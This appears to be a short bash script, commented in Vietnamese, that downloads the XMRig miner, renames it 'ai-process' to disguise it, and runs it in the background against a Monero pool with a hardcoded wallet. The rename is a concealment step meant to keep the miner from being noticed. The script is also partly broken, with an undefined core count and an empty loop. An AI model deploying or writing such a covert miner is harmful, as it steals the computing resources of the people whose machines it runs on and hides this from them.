
FAKE_NAME="ai-process"
POOL_URL="pool.hashvault.pro:443"
WALLET="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"
if [ ! -f "./xmrig" ]; then
    echo "[*] Đang tải XMrig..."
    curl -L -o xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
    tar -xf xmrig.tar.gz
    mv xmrig-*/xmrig . && chmod +x xmrig
    rm -rf xmrig-*
fi
cp xmrig $FAKE_NAME

# Phát hiện số core của máy
CPU_CORES=$(CPU_CORES)
# Vòng lặp vô hạn
    echo "[*] Đang chạy tiến trình '$FAKE_NAME' sử dụng khoảng $CORES_TO_USE luồng CPU..."
./$FAKE_NAME -o $POOL_URL -u $WALLET -k --tls --donate-level 1 --cpu-max-threads-hint=$CORES_TO_USE &
while true; do
    PID=$!

done
#chmod +x a.sh
#./a.sh


  